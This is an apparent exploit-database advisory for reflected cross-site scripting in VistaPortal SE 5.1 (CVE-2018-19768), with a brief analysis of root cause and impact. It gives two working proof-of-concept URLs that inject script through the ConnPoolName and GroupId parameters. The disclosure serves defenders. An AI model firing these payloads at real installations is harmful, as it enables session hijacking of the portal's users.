```
# Exploit Title: Cross Site Scripting in VistaPortal SE Version 5.1 (build 51029)
# Date: 28-11-2018
# Exploit Author: Rafael Pedrero
# Vendor Homepage: <http://www.infovista.com>
# Software Link: <http://www.infovista.com>
# Version: VistaPortal SE Version 5.1 (build 51029)
# Tested on: all
# CVE : CVE-2018-19768
# Category: webapps

1. Description

Cross Site Scripting exists in VistaPortal SE Version 5.1 (build 51029).
The page "SubPagePackages.jsp" has reflected XSS via ConnPoolName and
GroupId parameters.

2. Proof of Concept

<http://X.X.X.X/VPortal/mgtconsole/SubPagePackages.jsp?type=F&GroupId=5&DispProfile=true&ConnPoolName='">;><ScRiPt>alert("xss")</ScRiPt>&type=U&accessPath=Page
Packages&loginPath=PagePackageMainFolder
<http://X.X.X.X/VPortal/mgtconsole/SubPagePackages.jsp?type=F&GroupId=5'">;><ScRiPt>alert("xss")</ScRiPt>&type=U&DispProfile=true&ConnPoolName=default&accessPath=Page
Packages&loginPath=PagePackageMainFolder

Vulnerable parameters: ConnPoolName and GroupId

3. Solution:

Solutions in next versions this product.
Patch:
<https://www.owasp.org/index.php/XSS_>(Cross_Site_Scripting)_Prevention_Cheat_Sheet#XSS_Prevention_Rules
```

- **Root cause of vulnerability**: The application fails to properly sanitize user-supplied input before reflecting it back in the "SubPagePackages.jsp" page. Specifically, the `ConnPoolName` and `GroupId` parameters are vulnerable.
- **Weaknesses/vulnerabilities present**: Reflected Cross-Site Scripting (XSS) vulnerability.
- **Impact of exploitation**: Successful exploitation allows an attacker to execute arbitrary JavaScript code in the context of a user's browser session. This could lead to session hijacking, defacement, or other malicious actions.
- **Attack vectors**: The attack vector is through crafting a malicious URL with the vulnerable parameters containing XSS payloads.
- **Required attacker capabilities/position**: An attacker needs to convince a user to click on a specially crafted link. This can be done by sending the link via email, embedding it in a website or other methods.